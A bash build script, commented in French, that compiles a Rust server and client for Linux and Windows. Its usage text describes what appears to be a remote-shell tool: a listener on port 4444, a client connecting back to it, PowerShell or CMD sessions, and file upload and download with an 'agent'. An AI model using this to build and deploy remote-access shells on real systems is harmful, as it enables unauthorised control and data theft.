#!/usr/bin/env bash
set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

DIR="$(cd "$(dirname "$0")" && pwd)"
OUT="${DIR}/output"

log()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1"; exit 1; }

cd "$DIR"
mkdir -p "$OUT"

command -v cargo &>/dev/null || err "Cargo manquant — rustup.rs"
ok "Rust $(rustc --version 2>/dev/null | awk '{print $2}')"

export RUST_BACKTRACE=0
export RUSTFLAGS="-C debuginfo=0 -C force-frame-pointers=no"

# MinGW
HAS_MINGW=false
if command -v x86_64-w64-mingw32-gcc &>/dev/null; then
    LP=$(find /usr -name 'libkernel32.a' -print -quit 2>/dev/null)
    if [ -n "$LP" ]; then
        HAS_MINGW=true
        LP_DIR=$(dirname "$LP")

        CFG="$HOME/.cargo/config.toml"
        if ! grep -q "x86_64-pc-windows-gnu" "$CFG" 2>/dev/null; then
            mkdir -p "$(dirname "$CFG")"
            cat >> "$CFG" << TOML

[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
ar = "x86_64-w64-mingw32-ar"
rustflags = ["-L", "${LP_DIR}", "-C", "debuginfo=0", "-C", "force-frame-pointers=no"]
TOML
            ok "Cargo config written"
        fi

        rustup target list --installed 2>/dev/null | grep -q "x86_64-pc-windows-gnu" || \
            rustup target add x86_64-pc-windows-gnu
        ok "MinGW + Windows target OK"
    fi
fi

cargo clean 2>/dev/null || true

# Linux
echo ""
log "═══ BUILD LINUX (ELF) ═══"
cargo build --release --bin server 2>&1
cargo build --release --bin client 2>&1
cp target/release/server "$OUT/server_linux"
cp target/release/client "$OUT/client_linux"
chmod +x "$OUT/server_linux" "$OUT/client_linux"
ok "Linux OK"
file "$OUT/server_linux"
file "$OUT/client_linux"

# Windows
if [ "$HAS_MINGW" = true ]; then
    echo ""
    log "═══ BUILD WINDOWS (PE) ═══"

    RUSTFLAGS="-C debuginfo=0 -C force-frame-pointers=no -L ${LP_DIR}" \
        cargo build --release --target x86_64-pc-windows-gnu --bin server 2>&1

    RUSTFLAGS="-C debuginfo=0 -C force-frame-pointers=no -L ${LP_DIR}" \
        cargo build --release --target x86_64-pc-windows-gnu --bin client 2>&1

    cp target/x86_64-pc-windows-gnu/release/server.exe "$OUT/server.exe"
    cp target/x86_64-pc-windows-gnu/release/client.exe "$OUT/client.exe"
    ok "Windows OK"
    file "$OUT/server.exe"
    file "$OUT/client.exe"
else
    warn "MinGW non trouvé — skip Windows builds"
    warn "  sudo apt install gcc-mingw-w64-x86-64"
fi

# Résultat
echo ""
echo -e "${GREEN}════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  BUILD v3.1 COMPLET${NC}"
echo -e "${GREEN}════════════════════════════════════════════════${NC}"
ls -lh "$OUT/"
echo ""
echo "Usage:"
echo "  Server : ./output/server_linux -H 0.0.0.0 -p 4444 -l session.log"
echo "  Client : ./output/client_linux -H <IP> -p 4444"
echo "  Win    : output\\client.exe -H <IP> -p 4444"
echo ""
echo "Commandes in-session:"
echo "  powershell     → upgrade en PowerShell"
echo "  cmd            → retour CMD"
echo "  upload  <l> <r>→ server → agent"
echo "  download <r><l>→ agent → server"
